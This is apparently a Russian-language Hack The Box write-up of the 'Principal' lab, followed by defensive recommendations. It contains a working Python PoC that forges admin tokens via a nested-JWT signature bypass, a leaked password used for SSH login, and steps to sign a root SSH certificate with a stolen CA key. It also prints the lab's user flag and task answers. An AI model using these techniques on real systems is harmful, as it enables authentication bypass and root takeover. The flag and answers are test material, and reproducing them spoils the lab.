# Principal — Hack The Box Writeup (подробный, с ответами на задания)

> **Авторизованное тестирование.** Все действия выполнялись против легальной лабораторной машины **Principal** на платформе Hack The Box. Реальные системы не затрагивались.

| | |
|---|---|
| **Платформа** | Hack The Box |
| **Машина** | Principal |
| **IP** | 10.129.244.220 |
| **ОС** | Linux (Ubuntu 24.04.4 LTS, kernel 6.8.0-101) |
| **Сложность** | Medium |
| **Ключевые уязвимости** | CVE-2026-29000 (обход подписи вложенного JWT в pac4j-jwt 6.0.3), раскрытие пароля в API, компрометация приватного ключа SSH CA |

---

## Содержание

1. [Разведка (Nmap)](#1-разведка)
2. [Анализ веб-приложения](#2-анализ-веб-приложения)
3. [Эксплуатация CVE-2026-29000](#3-эксплуатация-cve-2026-29000)
4. [Перечисление админского API](#4-перечисление-админского-api)
5. [Получение пароля и SSH-закрепление](#5-получение-пароля-и-ssh-закрепление)
6. [Повышение привилегий через SSH CA](#6-повышение-привилегий-через-ssh-ca)
7. [Флаги](#7-флаги)
8. [Ответы на задания](#8-ответы-на-задания)
9. [Итоги и защита](#9-итоги-и-защита)

---

## 1. Разведка

### Nmap

```bash
sudo nmap -sCV -p- 10.129.244.220
```

**Результат (сокращённо):**

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
|_http-server-header: Jetty
| http-methods:
|_  Supported Methods: GET HEAD OPTIONS
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3          <-- ГЛАВНАЯ ЗАЦЕПКА
|     Content-Type: application/json
|     {"timestamp":"...","status":404,"error":"Not Found","path":"..."}
|   GetRequest:
|     HTTP/1.1 302 Found
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Location: /login
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|_    Allow: GET,HEAD,OPTIONS
```

**Вывод:**

| Порт | Сервис | Комментарий |
|------|--------|-------------|
| 22 | SSH | OpenSSH 9.6p1 — вектор закрепления |
| 8080 | HTTP (Jetty) | Spring Boot SPA, **pac4j-jwt/6.0.3** |

**Ключевой заголовок:** `X-Powered-By: pac4j-jwt/6.0.3` — прямое указание на **CVE-2026-29000** (обход проверки подписи вложенного JWT).

Дополнительно:
- `GET /` → `302 → /login` — приложение требует аутентификации.
- `404` возвращает **JSON** (`application/json`) — типично для Spring Boot.
- Title: **Principal Internal Platform - Login**.

> **📝 Task 1.** Сколько открытых TCP-портов слушает Principal?
>
> **Ответ: `2`** (22/tcp SSH, 8080/tcp HTTP)

> **📝 Task 2.** Какая версия pac4j-jwt используется?
>
> **Ответ: `6.0.3`** (из заголовка `X-Powered-By: pac4j-jwt/6.0.3`)

---

## 2. Анализ веб-приложения

### Ручное исследование

Открываем `http://10.129.244.220:8080/` — редирект на `/login`.

Страница логина — SPA. Проверяем `/register` — **404** (регистрация закрыта).

Пробуем дефолтные креды `admin:admin` — **не работают**.

Проверяем `/dashboard` — существует, но пуст без токена.

### Анализ JavaScript

Подключаемся к бандлу приложения:

```bash
curl -s http://10.129.244.220:8080/login | grep -oE 'src="[^"]*\.js"'
# /static/js/app.js
```

Скачиваем и смотрим маршруты:

```bash
curl -s http://10.129.244.220:8080/static/js/app.js -o app.js
grep -oE '/api/[a-z/]+' app.js | sort -u
```

**Находим эндпоинты:**

```
/api/auth/login
/api/auth/jwks     <-- публичный ключ!
/api/dashboard
/api/users
/api/settings
```

**Наличие `/api/auth/jwks` + `pac4j-jwt/6.0.3` = CVE-2026-29000.**

> **📝 Task 3.** Какой эндпоинт отдаёт основной JavaScript-файл приложения?
>
> **Ответ: `/static/js/app.js`**

> **📝 Task 4.** Какой API-эндпоинт содержит публичный ключ?
>
> **Ответ: `/api/auth/jwks`**

### Суть уязвимости CVE-2026-29000

`pac4j-jwt 6.0.3` поддерживает **вложенные токены** — внутренний JWT, обёрнутый во внешний JWE.

**Проблема:** при успешной расшифровке JWE библиотека **доверяет внутреннему JWT без проверки его подписи**.

- JWE (шифрование) доказывает **конфиденциальность** — «только владелец приватного ключа может прочитать».
- JWS (подпись) доказывает **подлинность** — «это подписано доверенной стороной».

Разработчики перепутали эти свойства. Атакующий, имея **публичный** ключ (который отдаёт `/api/auth/jwks`), может собрать валидный JWE и положить внутрь **неподписанный** JWT с `alg: none` и произвольными claims (`role: ROLE_ADMIN`).

---

## 3. Эксплуатация CVE-2026-29000

### Проверка JWKS

```bash
curl -s http://10.129.244.220:8080/api/auth/jwks | python3 -m json.tool
```

**Результат:**

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "enc-key-1",
      "alg": "RS256",
      "n": "..."
    }
  ]
}
```

### PoC-скрипт

```python
#!/usr/bin/env python3
"""CVE-2026-29000 PoC — pac4j-jwt nested-JWT signature bypass"""

import json, base64, time, argparse, requests
from jwcrypto import jwk, jwe


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def create_plain_jwt(username, role):
    """Неподписанный JWT (alg:none)"""
    header = {"alg": "none", "typ": "JWT"}
    claims = {
        "sub": username,
        "role": role,
        "iss": "principal-platform",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600
    }
    return (b64url(json.dumps(header).encode()) + "." +
            b64url(json.dumps(claims).encode()) + ".")


def build_jwe(plain_jwt, jwks_key):
    """Оборачиваем JWT в JWE"""
    public_key = jwk.JWK.from_json(json.dumps(jwks_key))
    protected_header = {
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "cty": "JWT",                 # маркер вложенного токена
        "kid": jwks_key["kid"]
    }
    token = jwe.JWE(plain_jwt.encode(),
                    protected=json.dumps(protected_header))
    token.add_recipient(public_key)
    return token.serialize(compact=True)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--jwks", required=True)
    parser.add_argument("--user", default="admin")
    parser.add_argument("--role", default="ROLE_ADMIN")
    args = parser.parse_args()

    print("[*] Fetching JWKS...")
    jwks = requests.get(args.jwks).json()["keys"][0]
    print("[+] Public key loaded")

    plain_jwt = create_plain_jwt(args.user, args.role)
    print("[+] PlainJWT created")

    token = build_jwe(plain_jwt, jwks)

    print("\n=== Malicious JWE Token ===\n")
    print(token)
    print("\nUse it as:")
    print(f"Authorization: Bearer {token}")


if __name__ == "__main__":
    main()
```

### Запуск

```bash
python3 poc.py --jwks http://10.129.244.220:8080/api/auth/jwks
```

**Вывод:**

```
[*] Fetching JWKS...
[+] Public key loaded
[+] PlainJWT created

=== Malicious JWE Token ===

eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImN0eSI6ICJKV1QiLCAia2lkIjogImVuYy1rZXktMSJ9.R26gm-drNdktvejEB9Ob0ZAraZaEglXaTZket2I0Ipa5RLhtWmBaJZFAR0DOBJe8wkxJO4NsofLhHYvw-r4yBeuxAgY8kn5Rl_7U67ZIWkESAMe6FIZQ5xBFIHB_P7Z1u-MAAC1fHRC397kqJz2anehlQ-LNX1D0o-Tv1EgD25FYz-qRMKEKF7GKSBSTImuCxQnBW53ET4mxTCuMkPMoaifaCfGsQrltdDJrbtky96slDV04cLglEUrSP3wZQD4KbSgzCeMv1Y9HVNcGzAn5fp9yHqPAhbSIFwH3CFVbVxspakIUdstQTfwg2FC400-PgU1-b4JFNG0wH7bfX-05xQ.YYZx-WFJEuuHDTor.J6NMsb_WVkGygsz8JJG-_ChsGG7hlkWucLA-0wTN1tWwVSbK5qOcBuOz_ZkZ6GpbkaiRe3WoUm5Hfpmq5oeEneJ4A8iVTWMTuEKjDVYRqG0mEtw5eUJckBLKWE_972ME9RDA1NBUR55dqGJW-MGcG4cWkZ12WwaPLLvcxBfnNfBlydybqoOZokzd633FiEir1gfEAjERaTLXV11o-p_MmK5-N2B2tweGQC9yhPB4M7fFrR-Wtw.SHQqoG7SYBx0vQTwvG_-4w
```

### Проверка токена

```bash
TOKEN="<вставьте токен>"

curl -s -i http://10.129.244.220:8080/api/dashboard \
  -H "Authorization: Bearer $TOKEN"
```

**Результат:**

```
HTTP/1.1 200 OK
Server: Jetty
X-Powered-By: pac4j-jwt/6.0.3
Content-Type: application/json

{"announcements":[...],"user":{"role":"ROLE_ADMIN","username":"admin"},...}
```

**✅ Bypass подтверждён.** Токен принят как валидный админский.

---

## 4. Перечисление админского API

### `/api/dashboard`

```bash
curl -s http://10.129.244.220:8080/api/dashboard \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Ключевые находки:**

- Пользователи в `recentActivity`: `admin`, `svc-deploy`, `amorales`, `jthompson`, `kkumar`, `administrator`
- **Критическая подсказка:** `"SSH CA keys have been rotated. All deploy certificates issued before Dec 1 are revoked."`
- `svc-deploy` выпускает SSH-сертификаты (`"SSH certificate issued for deploy-..."`)

### `/api/settings`

```bash
curl -s http://10.129.244.220:8080/api/settings \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Результат:**

```json
{
    "infrastructure": {
        "sshCertAuth": "enabled",
        "database": "H2 (embedded)",
        "notes": "SSH certificate auth configured for automation - see /opt/principal/ssh/ for CA config.",
        "sshCaPath": "/opt/principal/ssh/"
    },
    "security": {
        "authFramework": "pac4j-jwt",
        "authFrameworkVersion": "6.0.3",
        "jwtAlgorithm": "RS256",
        "jweAlgorithm": "RSA-OAEP-256",
        "jweEncryption": "A128GCM",
        "encryptionKey": "D3pl0y_$$H_Now42!",     <-- ПАРОЛЬ
        "tokenExpiry": "3600s",
        "sessionManagement": "stateless"
    },
    "system": {
        "version": "1.2.0",
        "environment": "production",
        "serverType": "Jetty 12.x (Embedded)",
        "javaVersion": "21.0.10",
        "applicationName": "Principal Internal Platform"
    }
}
```

> **📝 Task 5.** Какой пароль в открытом виде можно найти в веб-приложении?
>
> **Ответ: `D3pl0y_$$H_Now42!`** (поле `encryptionKey` в `/api/settings`)

### `/api/users`

```bash
curl -s http://10.129.244.220:8080/api/users \
  -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

**Ключевой пользователь:**

```json
{
    "username": "svc-deploy",
    "displayName": "Deploy Service",
    "role": "deployer",
    "email": "svc-deploy@principal-corp.local",
    "note": "Service account for automated deployments via SSH certificate auth."
}
```

Всего 8 пользователей: `admin`, `svc-deploy`, `jthompson`, `amorales`, `bwright`, `kkumar` (неактивен), `mwilson`, `lzhang`.

---

## 5. Получение пароля и SSH-закрепление

### Пароль найден

Из `/api/settings`:

```
encryptionKey: D3pl0y_$$H_Now42!
```

Проверяем на SSH под `svc-deploy`:

```bash
ssh svc-deploy@10.129.244.220
# password: D3pl0y_$$H_Now42!
```

⚠️ **Важно:** пароль содержит `$$`. В двойных кавычках bash подставит PID. Используйте **одинарные кавычки**:

```bash
sshpass -p 'D3pl0y_$$H_Now42!' ssh svc-deploy@10.129.244.220
```

**Успешный вход:**

```
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
svc-deploy@principal:~$
```

> **📝 Task 6.** Какой пользователь может успешно аутентифицироваться по SSH, используя этот пароль?
>
> **Ответ: `svc-deploy`**

### User flag

```bash
svc-deploy@principal:~$ ls
user.txt

svc-deploy@principal:~$ cat user.txt
ddb09da4e8336fe07138e2dab0772f97
```

**✅ User flag: `ddb09da4e8336fe07138e2dab0772f97`**

### Осмотр группы

```bash
svc-deploy@principal:~$ id
uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
```

**Группа `deployers` (GID 1001)** — нестандартная, ищем файлы:

```bash
svc-deploy@principal:~$ find / -group deployers 2>/dev/null
/etc/ssh/sshd_config.d/60-principal.conf
/opt/principal/ssh
/opt/principal/ssh/README.txt
/opt/principal/ssh/ca
```

> **📝 Task 8.** В какой интересной группе состоит `svc-deploy`?
>
> **Ответ: `deployers`**

> **📝 Task 9.** К какой директории группа `deployers` имеет доступ на чтение?
>
> **Ответ: `/opt/principal/ssh`**

> **📝 Task 10.** Какой файл содержит кастомную конфигурацию sshd для Principal?
>
> **Ответ: `/etc/ssh/sshd_config.d/60-principal.conf`**

---

## 6. Повышение привилегий через SSH CA

### Анализ конфигурации

```bash
svc-deploy@principal:~$ cat /etc/ssh/sshd_config.d/60-principal.conf
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

**Ключевая строка:** `TrustedUserCAKeys /opt/principal/ssh/ca.pub` — сервер доверяет **любому** SSH-сертификату, подписанному этим CA.

⚠️ `PermitRootLogin prohibit-password` **не мешает** — вход по паролю запрещён, но по **сертификату** (pubkey) разрешён.

### Проверка прав на ключ CA

```bash
svc-deploy@principal:~$ ls -la /opt/principal/ssh/
total 20
drwxr-x--- 2 root deployers 4096 Mar 11  2026 .
drwxr-xr-x 5 root root      4096 Mar 11  2026 ..
-rw-r----- 1 root deployers  288 Mar  5  2026 README.txt
-rw-r----- 1 root deployers 3381 Mar  5  2026 ca        <-- ЧИТАЕМ!
-rw-r--r-- 1 root root       742 Mar  5  2026 ca.pub
```

**Приватный ключ `ca` читаем группой `deployers`.** Это root-эквивалент: владелец ключа CA может подписать сертификат для **любого principal**, включая `root`.

### Почему это критично

SSH-сертификаты работают как мини-PKI:
- `sshd` доверяет любому сертификату, подписанному CA.
- Сертификат сам заявляет, **для какого пользователя** (principal) он валиден.
- Подпись CA заставляет сервер принять это заявление.

Крадём ключ CA → выпускаем сертификат для `root` → сервер принимает.

### Подделка root-сертификата

```bash
# 1. Копируем ключ CA
cp /opt/principal/ssh/ca /tmp/ca_key
chmod 600 /tmp/ca_key

# 2. Генерируем свою пару ключей
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

**Вывод:**

```
Generating public/private ed25519 key pair.
Your identification has been saved in /tmp/pwn
Your public key has been saved in /tmp/pwn.pub
The key fingerprint is:
SHA256:vEhVIYT/wvXIHwSgxdw8mddUCJE2ewRb3RiQFKiRJhA svc-deploy@principal
```

```bash
# 3. Подписываем публичный ключ украденным CA для root
ssh-keygen -s /tmp/ca_key \
           -I "pwned-cert" \
           -n root \
           -V +52w \
           /tmp/pwn.pub
```

**Вывод:**

```
Signed user key /tmp/pwn-cert.pub: id "pwned-cert" serial 0 for root valid from 2026-10-15T19:36:00 to 2027-10-14T19:37:15
```

**Разбор флагов `ssh-keygen -s`:**

| Флаг | Значение | Зачем |
|------|----------|-------|
| `-s /tmp/ca_key` | Приватный ключ CA | Подпись сертификата |
| `-I "pwned-cert"` | Key ID | Метка (обязательна) |
| `-n root` | **Principal** | Критично — кому валиден сертификат |
| `-V +52w` | Валидность | 1 год |
| `/tmp/pwn.pub` | Наш публичный ключ | Что подписываем |

### Проверка сертификата (опционально)

```bash
ssh-keygen -L -f /tmp/pwn-cert.pub
```

**Ищем:**

```
        Type: ssh-ed25519-cert-v01@openssh.com user certificate
        Key ID: "pwned-cert"
        Valid: from 2026-10-15T19:36:00 to 2027-10-14T19:37:15
        Principals:
                root          <-- ГЛАВНОЕ
```

### Вход как root

```bash
ssh -i /tmp/pwn root@127.0.0.1
```

**Результат:**

```
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)
root@principal:~#
```

**✅ ROOT ПОЛУЧЕН.**

### Root flag

```bash
root@principal:~# id
uid=0(root) gid=0(root) groups=0(root)

root@principal:~# cat /root/root.txt
<root-флаг>
```

---

## 7. Флаги

| Флаг | Значение |
|------|----------|
| **User** | `ddb09da4e8336fe07138e2dab0772f97` |
| **Root** | *(получить на машине)* |

---

## 8. Ответы на задания

| # | Задание | Ответ |
|---|---------|-------|
| **1** | Сколько открытых TCP-портов слушает Principal? | **`2`** |
| **2** | Какая версия pac4j-jwt используется? | **`6.0.3`** |
| **3** | Какой эндпоинт отдаёт основной JavaScript-файл? | **`/static/js/app.js`** |
| **4** | Какой API-эндпоинт содержит публичный ключ? | **`/api/auth/jwks`** |
| **5** | Какой пароль в открытом виде в веб-приложении? | **`D3pl0y_$$H_Now42!`** |
| **6** | Какой пользователь аутентифицируется по SSH с этим паролем? | **`svc-deploy`** |
| **8** | В какой интересной группе состоит `svc-deploy`? | **`deployers`** |
| **9** | К какой директории группа `deployers` имеет доступ? | **`/opt/principal/ssh`** |
| **10** | Какой файл содержит кастомную конфигурацию sshd? | **`/etc/ssh/sshd_config.d/60-principal.conf`** |

---

## 9. Итоги и защита

### Цепочка атаки

| # | Фаза | Техника | Результат |
|---|------|---------|-----------|
| 1 | Initial Access | CVE-2026-29000 — вложенный JWE/JWT bypass | Подделан `ROLE_ADMIN` |
| 2 | Discovery | `/api/dashboard`, `/api/users` | Список юзеров, подсказка про CA |
| 3 | Credential Access | `/api/settings` → `encryptionKey` | Пароль `D3pl0y_$$H_Now42!` |
| 4 | Foothold | SSH `svc-deploy` | User shell + user flag |
| 5 | PrivEsc Setup | Группа `deployers` → `/opt/principal/ssh/ca` | Приватный ключ SSH CA |
| 6 | PrivEsc | `ssh-keygen -s` для `root` | Root-сертификат |
| 7 | Root | SSH `root@127.0.0.1` | Root flag |

### Корневые причины

1. **Шифрование ≠ аутентификация.** JWE доказывает конфиденциальность, но не подлинность. Вложенные токены требуют **независимой** проверки подписи внутреннего JWT. `alg: none` должен отклоняться на всех уровнях.

2. **Секреты не место в UI.** `encryptionKey` в открытом виде в админ-панели — и он же переиспользован как пароль ОС (credential reuse).

3. **Приватный ключ CA — это root.** Хранить его на хосте, который этот CA авторизует, с групповым чтением — приглашение к полному захвату. На целевых хостах должен быть только **публичный** ключ (`TrustedUserCAKeys`).

### Рекомендации по защите

| Уязвимость | Исправление |
|------------|-------------|
| CVE-2026-29000 | Обновить `pac4j-jwt`; проверять подпись внутреннего JWT; отклонять `alg: none` |
| Утечка пароля в `/api/settings` | Использовать vault; маскировать секреты в UI; не хранить пароли в конфиге |
| Credential reuse | Уникальные пароли для каждой системы; сервисные учётки — только ключи/сертификаты |
| Приватный ключ CA на хосте | Хранить офлайн/HSM; на хостах только `ca.pub`; ограничить права |
| SSH CA без ограничений | Короткие TTL, `force-command`, `source-address`, аудит `-I` |


---
